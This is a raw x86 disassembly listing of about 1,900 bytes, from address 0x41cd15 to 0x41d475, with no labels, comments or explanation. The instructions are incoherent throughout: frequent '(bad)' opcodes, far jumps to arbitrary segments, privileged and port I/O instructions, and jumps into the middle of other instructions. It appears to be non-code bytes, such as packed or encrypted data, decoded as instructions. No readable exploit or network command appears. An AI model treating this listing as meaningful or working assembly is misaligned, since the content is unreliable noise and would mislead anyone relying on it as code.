  41cd15:	push   edi
  41cd16:	jnp    0x41ccdf
  41cd18:	inc    esi
  41cd19:	mov    DWORD PTR [edi-0x31],edx
  41cd1c:	jg     0x41cd9c
  41cd1e:	pop    ecx
  41cd1f:	dec    ecx
  41cd20:	fistp  WORD PTR [ebp+0x47]
  41cd23:	adc    edx,ebx
  41cd25:	cmp    bh,dl
  41cd27:	sbb    al,0xbd
  41cd29:	xor    ebx,DWORD PTR ds:0xa3fe4d6b
  41cd2f:	mov    bh,0x41
  41cd31:	jmp    FWORD PTR [esp+edi*8-0x74]
  41cd35:	mov    bh,0x3a
  41cd37:	bound  ebp,QWORD PTR [edi]
  41cd39:	dec    ecx
  41cd3a:	xchg   edx,eax
  41cd3b:	jbe    0x41cd9f
  41cd3d:	sti    
  41cd3e:	adc    al,0x8
  41cd40:	add    edi,DWORD PTR [edi]
  41cd42:	arpl   WORD PTR [edx],sp
  41cd44:	cmp    edx,DWORD PTR [ebp+eiz*1-0x1c]
  41cd48:	push   ebx
  41cd49:	mov    eax,ds:0xc230168d
  41cd4e:	adc    bh,BYTE PTR [ebx]
  41cd50:	shr    DWORD PTR [esi],1
  41cd52:	scas   eax,DWORD PTR es:[edi]
  41cd53:	lahf   
  41cd54:	pop    ds
  41cd55:	jb     0x41cdd3
  41cd57:	push   eax
  41cd58:	xchg   ebx,eax
  41cd59:	lods   al,BYTE PTR ds:[esi]
  41cd5a:	mov    esi,DWORD PTR [edx-0x75]
  41cd5d:	shr    dh,1
  41cd5f:	jge    0x41cd0c
  41cd61:	(bad)  
  41cd62:	mov    cl,0xb7
  41cd64:	loop   0x41cdc1
  41cd66:	sbb    eax,0x5a66038c
  41cd6b:	test   DWORD PTR [eax+0xe],edi
  41cd6e:	xchg   esp,eax
  41cd6f:	aas    
  41cd70:	pop    esi
  41cd72:	push   esi
  41cd73:	pop    ebp
  41cd74:	imul   ecx,DWORD PTR [edx+0x19a9ad87],0xe8381c8a
  41cd7e:	data16 (bad) 
  41cd81:	loope  0x41cd35
  41cd83:	xor    al,0xe3
  41cd85:	sub    DWORD PTR [eax+0x1d],0xffffffd7
  41cd89:	psrld  mm2,mm7
  41cd8c:	add    DWORD PTR [ebx],esp
  41cd8e:	xchg   esi,eax
  41cd8f:	hlt    
  41cd90:	add    BYTE PTR [eax+0x66],dh
  41cd93:	faddp  st(1),st
  41cd95:	gs push esi
  41cd97:	cmp    esp,DWORD PTR [ebx+0x16]
  41cd9a:	jmp    0x41cd74
  41cd9c:	and    dl,BYTE PTR [ecx]
  41cd9e:	inc    esp
  41cd9f:	mov    esi,0x328ca775
  41cda4:	out    dx,eax
  41cda5:	adc    ebx,DWORD PTR [ebx+eiz*4-0x56ed035c]
  41cdac:	push   ds
  41cdad:	mov    DWORD PTR [ecx],ecx
  41cdaf:	inc    eax
  41cdb0:	in     al,dx
  41cdb1:	test   DWORD PTR [eax-0xe],eax
  41cdb4:	cli    
  41cdb5:	mov    esp,DWORD PTR [ecx+0x2cc739b7]
  41cdbb:	mov    BYTE PTR [ebp+0x6],dh
  41cdbe:	dec    ecx
  41cdbf:	lods   eax,DWORD PTR ds:[esi]
  41cdc0:	mov    ah,0x75
  41cdc2:	mov    ds:0xd1e30d93,al
  41cdc7:	(bad)  
  41cdc8:	pop    edi
  41cdc9:	dec    esi
  41cdca:	pop    ebx
  41cdcb:	(bad)  
  41cdcc:	lock mov dh,0x75
  41cdcf:	add    dh,dh
  41cdd1:	or     ch,BYTE PTR [eax]
  41cdd3:	retf   
  41cdd4:	jo     0x41ce0f
  41cdd6:	int3   
  41cdd7:	sti    
  41cdd8:	dec    esi
  41cdd9:	sar    DWORD PTR [esi-0x18],0x2f
  41cddd:	push   ss
  41cdde:	into   
  41cddf:	iret   
  41cde0:	mov    edi,0x26d16d3e
  41cde5:	mov    esi,0xa74fc34d
  41cdea:	aad    0x11
  41cdec:	xchg   ecx,eax
  41cded:	sbb    dh,BYTE PTR [esi]
  41cdef:	lea    eax,[edx]
  41cdf1:	push   0x324d441e
  41cdf6:	fidivr DWORD PTR [eax+esi*4]
  41cdf9:	fs aaa 
  41cdfb:	loop   0x41cdce
  41cdfd:	sbb    eax,DWORD PTR [ebx]
  41cdff:	xchg   ebp,eax
  41ce00:	mov    cl,0xad
  41ce02:	and    al,0x7a
  41ce04:	add    cl,0xb7
  41ce07:	push   edi
  41ce08:	adc    al,0x9
  41ce0a:	mov    esi,0x2c06dfd2
  41ce0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce10:	inc    eax
  41ce11:	mov    ah,0xe2
  41ce13:	cmc    
  41ce14:	mov    ebx,0xbc2a8a67
  41ce19:	pusha  
  41ce1a:	test   al,0xb6
  41ce1c:	sbb    eax,DWORD PTR [edi]
  41ce1e:	fidiv  DWORD PTR [edi-0x280d6667]
  41ce24:	call   0x3e68:0xe5dabe46
  41ce2b:	fsub   QWORD PTR [ecx+0x36506b0e]
  41ce31:	xor    BYTE PTR [edi+0x45],cl
  41ce34:	test   ebx,esi
  41ce36:	jae    0x41ce38
  41ce38:	adc    eax,0x616aebfb
  41ce3d:	fs ins BYTE PTR es:[edi],dx
  41ce3f:	xchg   ebx,eax
  41ce40:	or     dh,BYTE PTR [edx+edx*4]
  41ce43:	lods   eax,DWORD PTR ds:[esi]
  41ce44:	dec    BYTE PTR [eax]
  41ce46:	je     0x41ce92
  41ce48:	sub    al,0xf2
  41ce4a:	mov    edx,0x4d7fa3a1
  41ce4f:	cmp    DWORD PTR [ebx],edx
  41ce51:	mov    bh,0x3e
  41ce53:	push   ecx
  41ce54:	cmp    DWORD PTR [edi+0x11f4afa9],ebx
  41ce5a:	push   0x78
  41ce5c:	inc    eax
  41ce5d:	push   ebx
  41ce5e:	sbb    ecx,DWORD PTR [ebx-0x29cd8987]
  41ce64:	dec    edx
  41ce65:	add    esi,esp
  41ce67:	fs xor ch,0xe9
  41ce6b:	xchg   DWORD PTR [eax+0x3a56114],ebp
  41ce71:	pop    ebx
  41ce72:	jmp    0xebc0:0x9c6fe48f
  41ce79:	sub    al,0x1b
  41ce7b:	leave  
  41ce7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce7d:	test   al,0xa6
  41ce7f:	out    0xb4,al
  41ce81:	into   
  41ce82:	push   edx
  41ce83:	xchg   edi,eax
  41ce84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce85:	rol    DWORD PTR [edx-0x6fa7eb72],1
  41ce8b:	call   0x8d77:0x7336e596
  41ce92:	icebp  
  41ce93:	jp     0x41ce1a
  41ce95:	fild   QWORD PTR [edx-0x5c]
  41ce98:	dec    esp
  41ce99:	idiv   DWORD PTR [ebp+esi*2+0x4e]
  41ce9d:	dec    ebx
  41ce9e:	pop    ebp
  41ce9f:	call   0x1c74ff71
  41cea4:	data16 sahf 
  41cea6:	sub    al,0x18
  41cea8:	xor    al,BYTE PTR [ebx-0x2b]
  41ceab:	mov    ds:0xf329e376,al
  41ceb0:	sahf   
  41ceb1:	sub    eax,0x4bb23b1d
  41ceb6:	mov    al,0x4c
  41ceb8:	js     0x41ce7a
  41ceba:	jns    0x41cec3
  41cebc:	pop    ss
  41cebd:	mov    esp,0x7e109a22
  41cec2:	jae    0x41cf18
  41cec4:	push   ebp
  41cec5:	push   0xd6c9b8ab
  41ceca:	enter  0xcf0b,0xa2
  41cece:	mov    al,ds:0xf95d9d52
  41ced3:	inc    esi
  41ced4:	mov    al,ds:0x3f86b07c
  41ced9:	call   0x85ff7568
  41cede:	mov    esi,0x195422f8
  41cee3:	pop    ecx
  41cee4:	sbb    eax,0xcb8c1956
  41cee9:	pop    eax
  41ceea:	inc    ebp
  41ceec:	hlt    
  41ceed:	cmp    eax,0xef69cf2f
  41cef2:	scas   eax,DWORD PTR es:[edi]
  41cef3:	mov    ebp,0x3836fd48
  41cef8:	xchg   ecx,eax
  41cef9:	aas    
  41cefa:	pushf  
  41cefb:	aaa    
  41cefc:	and    BYTE PTR [ebp+0xe25dc00],dl
  41cf02:	enter  0xd34a,0x4a
  41cf06:	add    cl,0xe4
  41cf09:	xchg   ebx,eax
  41cf0a:	sub    esp,eax
  41cf0c:	or     eax,0x8707e55
  41cf11:	push   0xffffffa9
  41cf13:	jmp    0x41cf12
  41cf15:	repz aad 0x4b
  41cf18:	test   BYTE PTR [edi],bh
  41cf1a:	mov    ds:0x325892f1,eax
  41cf1f:	neg    BYTE PTR [eax-0x58914f88]
  41cf25:	rcl    BYTE PTR [edx+0x26ca9221],0xfa
  41cf2c:	loopne 0x41cecb
  41cf2e:	clc    
  41cf2f:	dec    ebp
  41cf30:	xor    eax,0x45725a3e
  41cf35:	test   bl,bl
  41cf37:	fsub   st(5),st
  41cf39:	pop    esi
  41cf3a:	call   0xce5063f7
  41cf3f:	imul   esi,DWORD PTR [edi+0x73b3bd24],0xf58b5331
  41cf49:	dec    esp
  41cf4a:	pop    ebx
  41cf4b:	mov    eax,ds:0x9c5ddfa3
  41cf50:	(bad)  
  41cf51:	or     ebp,DWORD PTR [esi+ebx*8+0x52]
  41cf55:	ss sbb eax,0x733a7de
  41cf5b:	dec    ecx
  41cf5c:	retf   0x865a
  41cf5f:	icebp  
  41cf60:	mov    ah,0x71
  41cf62:	jle    0x41cf5a
  41cf64:	outs   dx,DWORD PTR ds:[esi]
  41cf65:	cmc    
  41cf66:	xor    al,0xed
  41cf68:	pop    es
  41cf69:	mov    cs,WORD PTR [eax-0x21]
  41cf6c:	xchg   ebx,eax
  41cf6d:	cmp    al,0x3c
  41cf6f:	sub    ch,BYTE PTR [ebp+0x21a7fb7e]
  41cf75:	mov    dh,0xaa
  41cf77:	shl    BYTE PTR [ebx-0x1],cl
  41cf7a:	jb     0x41cf2e
  41cf7c:	shl    bl,cl
  41cf7e:	cmp    al,0x71
  41cf80:	sbb    ebx,eax
  41cf82:	mov    bl,0xff
  41cf84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf85:	std    
  41cf86:	imul   edx,ebp,0xffffffa6
  41cf89:	mov    eax,ds:0xd21f45f5
  41cf8e:	out    dx,eax
  41cf8f:	test   al,0xca
  41cf91:	and    DWORD PTR [edx+0x6a542a7f],edi
  41cf97:	mov    eax,0xbe317519
  41cf9c:	jo     0x41cfc8
  41cf9e:	xor    eax,0xa40ec0bf
  41cfa3:	jmp    0x64e3caa3
  41cfa8:	push   esp
  41cfa9:	das    
  41cfaa:	sub    eax,0x453e9cad
  41cfaf:	stos   DWORD PTR es:[edi],eax
  41cfb0:	xor    al,BYTE PTR [edx]
  41cfb2:	jo     0x41cfc4
  41cfb4:	fbld   TBYTE PTR [ebx+ebx*1]
  41cfb7:	pop    ebp
  41cfb8:	push   eax
  41cfb9:	adc    ecx,eax
  41cfbb:	daa    
  41cfbc:	pop    eax
  41cfbd:	dec    edx
  41cfbe:	jae    0x41d026
  41cfc0:	fisubr DWORD PTR [edi]
  41cfc2:	inc    esi
  41cfc3:	push   0xd1b04ac1
  41cfc8:	bndldx (bad),[ecx+0x68]
  41cfcc:	mov    al,0xed
  41cfce:	jnp    0x41d027
  41cfd0:	stc    
  41cfd1:	ss not esp
  41cfd4:	sbb    eax,0x74a7dcb4
  41cfd9:	das    
  41cfda:	jp     0x41d04c
  41cfdc:	and    BYTE PTR [ebx],al
  41cfde:	sbb    edi,DWORD PTR [ebp-0x33]
  41cfe1:	test   DWORD PTR [eax-0x133a9c8c],edx
  41cfe7:	sub    ch,BYTE PTR [ebp-0xd832b20]
  41cfed:	pop    esi
  41cfee:	ror    BYTE PTR [esi+esi*2],0x83
  41cff2:	xchg   DWORD PTR [eax+eiz*1+0x34],ecx
  41cff6:	sbb    al,0x9e
  41cff8:	add    al,0xc9
  41cffa:	mov    ah,0x83
  41cffc:	test   esp,ecx
  41cffe:	retf   0xc2bf
  41d001:	test   DWORD PTR [eax+ebx*1],ebp
  41d004:	bound  eax,QWORD PTR [edx-0x68]
  41d007:	fstp   DWORD PTR [ebx]
  41d009:	ins    BYTE PTR es:[edi],dx
  41d00a:	sub    dl,BYTE PTR ds:0x6947c781
  41d010:	bound  ebp,QWORD PTR [edx]
  41d012:	add    DWORD PTR [ebx-0x865e34f],edi
  41d018:	gs jmp 0x2849:0x387296d4
  41d020:	pop    edi
  41d021:	outs   dx,BYTE PTR ds:[esi]
  41d022:	add    edi,DWORD PTR [edi-0x58186e88]
  41d028:	lock xchg esp,eax
  41d02a:	sub    eax,0x9509817
  41d02f:	or     al,0x7
  41d031:	cld    
  41d032:	(bad)
  41d035:	lods   eax,DWORD PTR ds:[esi]
  41d036:	(bad)  
  41d037:	es (bad) 
  41d039:	test   eax,0xcb8c0617
  41d03e:	dec    ebp
  41d03f:	xor    eax,0x4e1bfb0e
  41d044:	adc    esi,ebp
  41d046:	pop    eax
  41d047:	push   ecx
  41d048:	pop    edx
  41d049:	jp     0x41cfff
  41d04b:	xchg   ebx,eax
  41d04c:	pop    ecx
  41d04d:	mov    eax,0xb6ee7bbb
  41d052:	lea    esp,[eax+0x7f]
  41d055:	test   DWORD PTR [edi+eiz*2],ecx
  41d058:	ror    BYTE PTR [ebp+0x17960589],1
  41d05e:	pop    DWORD PTR [edx+0x480bd010]
  41d064:	int    0xf5
  41d066:	imul   edi,DWORD PTR [ecx-0x64],0xffffff91
  41d06a:	push   ss
  41d06b:	stc    
  41d06c:	or     DWORD PTR ds:0xe492ebbe,ebp
  41d072:	das    
  41d073:	cli    
  41d074:	jle    0x41d075
  41d076:	in     eax,dx
  41d077:	jno    0x41d023
  41d079:	sbb    cl,BYTE PTR [ebx+0x4f]
  41d07c:	jmp    0x577c:0x43436b2e
  41d083:	inc    esi
  41d084:	cmp    edx,DWORD PTR [ecx-0x1c4f30e7]
  41d08a:	sbb    BYTE PTR [ebx+eax*2+0x55],ah
  41d08e:	into   
  41d08f:	out    0xd4,eax
  41d091:	or     ebx,DWORD PTR [edi+0x5b6235c5]
  41d097:	les    ecx,FWORD PTR [edi+0x6]
  41d09a:	mov    ecx,0x732ed95b
  41d09f:	and    esi,ebx
  41d0a1:	sbb    DWORD PTR [edx+0x79],ecx
  41d0a4:	adc    ch,BYTE PTR [ebx-0x1b]
  41d0a7:	mov    al,0x91
  41d0a9:	xchg   ebp,eax
  41d0aa:	stos   DWORD PTR es:[edi],eax
  41d0ab:	pop    edx
  41d0ac:	mov    dh,0x5c
  41d0ae:	xlat   BYTE PTR ds:[ebx]
  41d0af:	inc    edi
  41d0b0:	ret    0x2712
  41d0b3:	call   0xf9da:0xef6ba0bb
  41d0ba:	mov    dh,0x61
  41d0bc:	mov    edx,0x107cfc4
  41d0c1:	repz push cs
  41d0c3:	mov    bl,0xa3
  41d0c5:	jno    0x41d0f2
  41d0c7:	push   cs
  41d0c8:	jne    0x41d0de
  41d0ca:	push   ebp
  41d0cb:	clc    
  41d0cc:	inc    ebp
  41d0cd:	adc    bh,BYTE PTR [edi]
  41d0cf:	iret   
  41d0d0:	or     bh,BYTE PTR [edi+0x21]
  41d0d3:	adc    al,0x5d
  41d0d5:	sbb    dl,dl
  41d0d7:	inc    eax
  41d0d8:	inc    eax
  41d0d9:	inc    edi
  41d0da:	jo     0x41d0a7
  41d0dc:	shl    BYTE PTR [ebx+0x77],0xbe
  41d0e0:	pushf  
  41d0e1:	cmc    
  41d0e2:	sub    eax,0x6a335f2f
  41d0e7:	adc    ecx,DWORD PTR [edi+0x360d51d9]
  41d0ed:	in     eax,0x32
  41d0ef:	arpl   WORD PTR [ebx+edx*1-0x37],bx
  41d0f3:	je     0xad7810b8
  41d0f9:	test   al,0x71
  41d0fb:	inc    eax
  41d0fc:	stos   DWORD PTR es:[edi],eax
  41d0fd:	loopne 0x41d143
  41d0ff:	enter  0x6efb,0xf2
  41d103:	push   esi
  41d104:	and    BYTE PTR [esi],bl
  41d106:	out    dx,al
  41d107:	imul   esi,DWORD PTR [ebp+0x39],0xffffff8c
  41d10b:	ins    DWORD PTR es:[edi],dx
  41d10c:	popf   
  41d10d:	aas    
  41d10e:	mov    dl,0x42
  41d110:	das    
  41d111:	jae    0x41d16b
  41d113:	push   es
  41d114:	leave  
  41d115:	adc    eax,0xd6b067ca
  41d11a:	das    
  41d11b:	cdq    
  41d11c:	lods   al,BYTE PTR ds:[esi]
  41d11d:	cs int 0xf
  41d120:	mov    DWORD PTR [esi+0x1a],edi
  41d123:	pop    ds
  41d124:	jecxz  0x41d134
  41d126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d127:	mov    ebp,0x30bff214
  41d12c:	mov    dl,0x8
  41d12e:	rcl    BYTE PTR [esi+0xc6fc65c],0x7c
  41d135:	sub    eax,0x9c6e8b7a
  41d13a:	dec    ecx
  41d13b:	cdq    
  41d13c:	xor    BYTE PTR [ecx],0xe
  41d13f:	pop    ebp
  41d140:	jmp    0xa15058c9
  41d145:	dec    ebx
  41d146:	push   ecx
  41d147:	(bad)  
  41d148:	out    0x73,eax
  41d14a:	lea    esi,[edx+0x1f]
  41d14d:	mov    ds:0x6346dc0a,eax
  41d152:	into   
  41d153:	xchg   DWORD PTR [ecx+0x2b],edx
  41d156:	sahf   
  41d157:	mov    ecx,0x3d8965f5
  41d15c:	pop    ecx
  41d15d:	adc    DWORD PTR [ebx-0x5b],eax
  41d160:	sub    dl,BYTE PTR [ebx+0x70]
  41d163:	setle  BYTE PTR [ecx+0x61]
  41d167:	fcomp  DWORD PTR [edx-0x56]
  41d16a:	mov    bh,BYTE PTR [edi+0x15984300]
  41d170:	jecxz  0x41d1c9
  41d172:	jo     0x41d156
  41d174:	popf   
  41d175:	(bad)  
  41d176:	std    
  41d177:	test   BYTE PTR [edx],ah
  41d179:	mov    BYTE PTR [edi+ecx*4-0x45],bl
  41d17d:	dec    eax
  41d17e:	xor    eax,0x112a74fc
  41d183:	push   ebp
  41d184:	inc    eax
  41d185:	mov    ?,WORD PTR [ebx+0x69dfc33e]
  41d18b:	mov    edi,0x396f5e4b
  41d190:	mov    dh,0xe
  41d192:	push   ecx
  41d193:	stos   DWORD PTR es:[edi],eax
  41d194:	int    0x1e
  41d196:	or     DWORD PTR [edx+ecx*8-0x31c5cd47],ebp
  41d19d:	cmc    
  41d19e:	jmp    0x41d17e
  41d1a0:	xor    esp,DWORD PTR [eax+0x1915a9ff]
  41d1a6:	icebp  
  41d1a7:	not    BYTE PTR [ecx]
  41d1a9:	fwait
  41d1aa:	in     eax,0x8
  41d1ac:	mov    dh,0xb0
  41d1ae:	and    eax,edi
  41d1b0:	add    al,0xb3
  41d1b2:	loop   0x41d13f
  41d1b4:	test   DWORD PTR [ebx+ebx*1+0x28],edi
  41d1b8:	sbb    BYTE PTR [edx-0x5b],0xd8
  41d1bc:	ret    0x5a42
  41d1bf:	push   0x9ba6bdb1
  41d1c4:	xchg   ecx,eax
  41d1c5:	xlat   BYTE PTR ds:[ebx]
  41d1c6:	mov    eax,ds:0x67c99f1d
  41d1cb:	push   esi
  41d1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1cd:	mov    BYTE PTR [eax],dl
  41d1cf:	jb     0x41d164
  41d1d1:	(bad)  
  41d1d2:	es ja  0x41d1f9
  41d1d5:	not    DWORD PTR [eax+0x673f0de1]
  41d1db:	or     ebp,DWORD PTR [ebp-0x23]
  41d1de:	scas   al,BYTE PTR es:[edi]
  41d1df:	test   BYTE PTR [edx+0x44],al
  41d1e2:	aas    
  41d1e3:	mov    edx,DWORD PTR [edi-0x7a]
  41d1e6:	icebp  
  41d1e7:	cmp    ah,BYTE PTR [edi]
  41d1e9:	mov    esp,0x64254452
  41d1ee:	outs   dx,BYTE PTR ds:[esi]
  41d1ef:	sti    
  41d1f0:	jne    0x41d21f
  41d1f2:	pop    edi
  41d1f3:	enter  0x9474,0xa0
  41d1f7:	sti    
  41d1f8:	cld    
  41d1f9:	rcl    ah,cl
  41d1fb:	std    
  41d1fc:	sahf   
  41d1fd:	push   esi
  41d1fe:	sbb    cl,BYTE PTR [ecx]
  41d200:	push   ss
  41d201:	enter  0xe8ae,0xe2
  41d205:	mov    ebx,0x2115f4b2
  41d20a:	push   ecx
  41d20b:	dec    esi
  41d20c:	dec    eax
  41d20d:	das    
  41d20e:	std    
  41d20f:	imul   edi,DWORD PTR [edi],0xc9697085
  41d215:	sbb    BYTE PTR [esi],al
  41d217:	out    0x92,al
  41d219:	call   FWORD PTR [edi-0x5f]
  41d21c:	loopne 0x41d1a8
  41d21e:	enter  0x5268,0x46
  41d222:	add    dl,BYTE PTR [edi-0x61]
  41d225:	retf   
  41d226:	pop    es
  41d227:	xchg   esp,eax
  41d228:	sub    BYTE PTR [esi],bh
  41d22a:	cmp    bl,BYTE PTR ds:0x7e699aec
  41d230:	mov    DWORD PTR cs:[ebx],esi
  41d233:	mov    cl,0xac
  41d235:	rcr    DWORD PTR [edx-0x7f],cl
  41d238:	inc    eax
  41d239:	jge    0x41d284
  41d23b:	sbb    ebp,ebx
  41d23d:	pop    esp
  41d23e:	iret   
  41d23f:	pop    eax
  41d240:	inc    edi
  41d241:	push   ebx
  41d242:	push   edi
  41d243:	mov    ebp,0x1b690a18
  41d248:	jle    0x9665fa4
  41d24e:	in     al,0x55
  41d250:	gs sbb eax,0xc246d299
  41d256:	in     eax,0x2d
  41d258:	pop    eax
  41d259:	rcl    DWORD PTR [ebx-0x318b10e4],cl
  41d25f:	shr    BYTE PTR [ecx+eiz*1],0x37
  41d263:	daa    
  41d264:	ret    0xee5f
  41d267:	lock cmp DWORD PTR [ecx-0xa],esi
  41d26b:	mov    ecx,0x9bd1a6d9
  41d270:	jns    0x41d2d8
  41d272:	xor    bh,BYTE PTR [eax-0x23a74bb4]
  41d278:	and    eax,DWORD PTR [ebx]
  41d27a:	popa   
  41d27b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d27c:	jne    0x41d2b3
  41d27e:	retf   
  41d27f:	pop    esi
  41d280:	fisttp QWORD PTR [ebp-0x29710fd3]
  41d286:	dec    esi
  41d287:	imul   ebp,DWORD PTR [ebp+0x11],0x37516faf
  41d28e:	rol    ch,0xd1
  41d291:	ins    DWORD PTR es:[edi],dx
  41d292:	and    BYTE PTR [esi-0x41],bh
  41d295:	not    DWORD PTR [ebx+edi*1-0x43b5b81e]
  41d29c:	or     bh,BYTE PTR [ecx+0x2c095ce2]
  41d2a2:	mov    ds:0x2ccf670c,eax
  41d2a7:	rsm    
  41d2a9:	mov    dl,0x1f
  41d2ab:	push   ebx
  41d2ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2ad:	int    0x54
  41d2af:	scas   al,BYTE PTR es:[edi]
  41d2b0:	(bad)  
  41d2b1:	jmp    0x41d294
  41d2b3:	jge    0x41d291
  41d2b5:	gs ja  0x41d2bf
  41d2b8:	fild   QWORD PTR [esi]
  41d2ba:	inc    esp
  41d2bb:	inc    ebp
  41d2bc:	mov    eax,0x1ccad1e
  41d2c1:	lods   al,BYTE PTR ss:[esi]
  41d2c3:	fs out dx,eax
  41d2c5:	loopne 0x41d277
  41d2c7:	inc    edi
  41d2c8:	sti    
  41d2c9:	mul    BYTE PTR [edi-0x3a562da8]
  41d2cf:	(bad)  
  41d2d0:	sbb    ch,ch
  41d2d2:	data16 shl BYTE PTR [edx],0xde
  41d2d6:	mov    ecx,0x8a494313
  41d2db:	in     al,0xd6
  41d2dd:	dec    ecx
  41d2de:	pop    ecx
  41d2df:	ret    0x605d
  41d2e2:	out    0x13,al
  41d2e4:	sub    cl,BYTE PTR [eax]
  41d2e6:	scas   al,BYTE PTR es:[edi]
  41d2e7:	xor    al,0x25
  41d2e9:	inc    esi
  41d2ea:	std    
  41d2eb:	and    BYTE PTR [eax],0x4
  41d2ee:	mov    ecx,0x3dee5924
  41d2f3:	bound  ebp,QWORD PTR [edx+ebp*4-0x48]
  41d2f7:	sbb    DWORD PTR [ecx],ebx
  41d2f9:	dec    eax
  41d2fa:	sub    edi,edi
  41d2fc:	push   cs
  41d2fd:	(bad)
  41d300:	jbe    0x41d37d
  41d302:	push   cs
  41d303:	cmp    eax,0x8a91eaa4
  41d308:	dec    ecx
  41d309:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d30a:	xchg   ebx,eax
  41d30b:	adc    eax,0x2f8aca85
  41d310:	mov    edx,0xd02095ef
  41d315:	cwde   
  41d316:	push   0x67ab2ef
  41d31b:	enter  0x2230,0x60
  41d31f:	into   
  41d320:	iret   
  41d321:	push   edx
  41d322:	retf   
  41d323:	int    0x9a
  41d325:	mov    ah,0x1d
  41d327:	test   BYTE PTR [eax-0x78],dl
  41d32a:	add    eax,0x89196d6e
  41d32f:	or     al,0xa
  41d331:	fwait
  41d332:	mov    ds:0x864ea4f2,al
  41d337:	bound  ebx,QWORD PTR [ebx-0x73a353c8]
  41d33d:	mov    edi,0xe9cd3ad1
  41d342:	inc    ebp
  41d343:	jb     0x41d377
  41d345:	outs   dx,BYTE PTR ds:[esi]
  41d346:	mov    esp,esi
  41d348:	push   edi
  41d349:	inc    eax
  41d34a:	std    
  41d34b:	test   BYTE PTR [ecx-0x63],al
  41d34e:	arpl   bp,sp
  41d350:	fwait
  41d351:	sar    BYTE PTR [edx-0x17],0x25
  41d355:	stos   DWORD PTR es:[edi],eax
  41d356:	push   eax
  41d357:	push   esp
  41d358:	iret   
  41d359:	sti    
  41d35a:	(bad)  
  41d35b:	mov    esi,0x16920719
  41d360:	jo     0x41d3b5
  41d362:	fnsave [ebx+edx*8-0x50]
  41d366:	cmp    DWORD PTR [esi],ebx
  41d368:	and    esp,DWORD PTR [edi+0x7e]
  41d36b:	push   0xffffff95
  41d36d:	nop
  41d36e:	pop    ebx
  41d36f:	out    dx,al
  41d370:	inc    edx
  41d371:	sbb    DWORD PTR [ebx+0x62e5a339],edx
  41d377:	outs   dx,BYTE PTR ds:[esi]
  41d378:	pop    eax
  41d379:	lock add ah,BYTE PTR [edi]
  41d37c:	xchg   esp,eax
  41d37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d37e:	mov    edx,0xa958fc7
  41d383:	es dec esi
  41d385:	inc    eax
  41d386:	and    BYTE PTR [ebp+0x7a],ch
  41d389:	mov    ecx,?
  41d38b:	int    0xa
  41d38d:	sbb    cl,bl
  41d38f:	int3   
  41d390:	add    DWORD PTR [edi],edi
  41d392:	add    DWORD PTR [edx+0x61bdc886],eax
  41d398:	inc    esp
  41d399:	lds    ebx,FWORD PTR [edi-0x74]
  41d39c:	repz dec edx
  41d39e:	mov    esp,0xb2b89daf
  41d3a3:	push   0x36
  41d3a5:	daa    
  41d3a6:	mov    ecx,0xbd563f28
  41d3ab:	and    al,0x6a
  41d3ad:	pop    ebp
  41d3ae:	rcl    DWORD PTR [eax-0x409f3e7b],cl
  41d3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3b5:	mov    esp,0xac3ebf11
  41d3ba:	in     al,0x77
  41d3bc:	aas    
  41d3bd:	xor    cl,ah
  41d3bf:	leave  
  41d3c0:	xor    esp,esi
  41d3c2:	lods   eax,DWORD PTR ds:[esi]
  41d3c3:	dec    edi
  41d3c4:	lods   al,BYTE PTR ds:[esi]
  41d3c5:	mov    ch,0xbe
  41d3c7:	and    eax,0xb5e22bf4
  41d3cc:	jae    0x41d425
  41d3ce:	lahf   
  41d3cf:	adc    DWORD PTR [ebp-0x1baba44],esi
  41d3d5:	pop    ebp
  41d3d6:	out    0xc1,eax
  41d3d8:	popa   
  41d3d9:	shl    BYTE PTR [edi-0x7850a0],cl
  41d3df:	push   esp
  41d3e0:	(bad)  
  41d3e1:	jmp    0x41d3c4
  41d3e3:	mov    eax,0xf2b86e3a
  41d3e8:	fwait
  41d3e9:	sbb    al,0x21
  41d3eb:	iret   
  41d3ec:	gs cmp DWORD PTR ds:[esi+0x69],ebp
  41d3f1:	mov    esi,0x717f4c53
  41d3f6:	jbe    0x41d468
  41d3f8:	mov    DWORD PTR [eax+0xbebc1af],eax
  41d3fe:	xchg   ebx,eax
  41d3ff:	adc    esp,DWORD PTR [ebp+0x4fc21e66]
  41d405:	aas    
  41d406:	jmp    0x41d3a2
  41d408:	inc    ebp
  41d409:	sbb    BYTE PTR [ecx-0x22fd780c],0x5c
  41d410:	sar    BYTE PTR [edi],0x8a
  41d413:	jb     0x41d45e
  41d415:	mov    ds:0x9b2d34d9,al
  41d41a:	loopne 0x41d3a1
  41d41c:	clc    
  41d41d:	fnsave [ebx+0x51]
  41d420:	pop    edi
  41d421:	mov    ah,0x58
  41d423:	dec    ebx
  41d424:	cmp    eax,0x71047a2
  41d429:	test   BYTE PTR [edi-0x63],ah
  41d42c:	shl    BYTE PTR [ecx+0x11],0x30
  41d430:	out    dx,al
  41d431:	fs call 0xbdc62dfc
  41d437:	or     bh,cl
  41d439:	mov    bh,0x4
  41d43b:	xchg   ebp,eax
  41d43c:	mov    esi,0x27fccf82
  41d441:	cmp    al,0x23
  41d443:	dec    ebx
  41d444:	or     eax,0xc2b5aefb
  41d449:	or     al,0x94
  41d44b:	mov    ebp,0xe7548f38
  41d450:	inc    edx
  41d451:	dec    eax
  41d452:	mov    cl,0xe4
  41d454:	(bad)  
  41d455:	dec    esi
  41d456:	retf   
  41d457:	and    esp,DWORD PTR [ecx+0x45]
  41d45a:	sub    edi,DWORD PTR [eax-0x3e]
  41d45d:	and    ah,BYTE PTR [ebx]
  41d45f:	jmp    0xc19f:0x14b3dfbc
  41d466:	push   edx
  41d467:	adc    eax,0xf3cdefdb
  41d46c:	aam    0xbb
  41d46e:	rcr    dh,0x5
  41d471:	lods   al,BYTE PTR ds:[esi]
  41d472:	lea    esp,[eax+0x12]
  41d475:	enter  0xc030,0x32
